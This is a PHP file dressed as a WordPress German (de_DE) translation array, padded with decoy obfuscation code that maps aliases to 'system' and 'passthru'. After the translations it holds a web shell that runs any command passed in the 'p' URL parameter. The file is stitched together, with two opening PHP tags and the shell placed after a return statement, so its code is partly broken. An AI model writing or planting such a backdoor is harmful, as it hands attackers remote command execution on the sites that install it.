<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=n != 1;','messages'=>['html_lang_attribute'=>'de-DE','text directionltr'=>'ltr','number_format_decimal_point'=>',','number_format_thousands_sep'=>'.','Update %s now'=>'Jetzt %s aktualisieren','[%1$s] Confirm Action: %2$s'=>'[%1$s] Aktion bestätigen: %2$s','[%s] Erasure Request Fulfilled'=>'[%s] Löschauftrag ausgeführt','[%s] Personal Data Export'=>'[%s] Export personenbezogener Daten', 'You must provide at least one recipient email address.'=>'Du musst mindestens eine Empfänger-E-Mail-Adresse angeben.'],'language'=>'de_DE','x-generator'=>'Poedit 2.2.1'];

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>